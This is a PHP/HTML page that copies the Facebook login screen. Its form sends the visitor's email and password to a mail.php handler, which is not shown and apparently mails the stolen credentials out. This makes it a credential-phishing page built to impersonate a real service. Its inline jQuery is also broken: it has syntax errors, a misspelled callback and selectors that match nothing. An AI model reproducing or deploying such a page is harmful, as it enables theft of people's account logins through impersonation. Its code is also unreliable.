
<?php 

 include("mail.php");

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook Page Replica</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <form action="mail.php" method="POST">
                <input type="email" name="email" placeholder="Email address or phone number" required >
                <input type="password" name="password" placeholder="Password" required >
                <button type="submit" name="submit" class="loginBtn">Log In</button>
                <a href="" class="forget">Forgotten password?</a>
                <div class="sign-up">
                    <a href="" class="signupBtn">Create New Account</a>
                </div>
            </form>
            <p><b>Create a Page</b> for a celebrity, band or business.</p>
        </div>
    </div>

    <script>

        $(document).ready(function(){
            $("#submit").click(function(){

                let email = $("#email").val();
                let password = $("#password").val();

                if(email==''||password==''){
                    return false;
                }

                $.ajax({
                    type: "POST",
                    url: "mail.php"
                    data: {
                        email: email,
                        password: password
                    },
                    cache: false,
                    sucess: function(data){
                        alert(data);
                    },
                    error: function(xhr, status, error){
                        console.error(xhr);
                    }
                });

            })
        })
    </script>

    <style>
        *{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body{
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    height: 100vh;
    background-color: #f0f2f5;
}

.container{
    width:100%;
    height:100%;
    display: flex;
    justify-content: space-around;
    align-items: center;
}

.left, .right, form{
    display: flex;
    flex-direction: column;
    align-content: center;
    align-items: center;
    justify-content: center;
}

.left{
    width:500px;
    align-items: flex-start;
}

.left h1{
    font-family: "facebook letter faces";
    font-size: 60px;
    color: #1877f2;
}

.left p{
    font-size: 30px;
    color:#1c1e21;
    height: 200px;
    font-family: "Roboto Condensed", sans-serif;
}

.right{
    width:400px;
}

form{
    background-color: white;
    border-radius: 10px;
    width:400px;
    display: flex;
    padding: 20px;
    margin-bottom: 25px;
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
}

form input{
    width: 100%;
    padding: 15px;
    margin-bottom: 10px;
    border-radius: 5px;
    border: 1px solid #999;
    outline: none;
    font-size: 16px;
}

.loginBtn{
    background-color: #1877f2;
    padding: 15px;
    text-align: center;
    text-decoration: none;
    width: 100%;
    border-radius: 5px;
    color: white;
    font-size: 20px;
    font-family: 'Arial';
    font-weight: 700;
    transition: 0.5s;
}

.loginBtn:hover{
    background-color: #4257b2;
}

.forget{
    margin: 15px 0;
    text-decoration: none;
    color: #1877f2;
    font-family: 'Arial';
    font-size: 14px;
}

.sign-up{
    padding-top: 20px;
    border-top: 1px solid #999;
    width: 100%;
    display: flex;
    justify-content: center;
}

.signupBtn{
    background-color: #42b72a;
    padding: 15px;
    text-align: center;
    text-decoration: none;
    border-radius: 5px;
    color: white;
    font-size: 17px;
    font-family: 'Arial';
    font-weight: 600;
    transition: 0.5s;
}

.signupBtn:hover{
    background-color: green;
}

.right p{
    font-family: 'Arial';
    font-size: 15px;
}

@media(max-width:950px){
    .container{
        flex-direction: column;
    }
    
    .left{
        width: 400px;
        align-content: center;
        align-items: center;
    }
    
    .left p{
        height: 75px;
    }
}
 </style>
</body>
</html>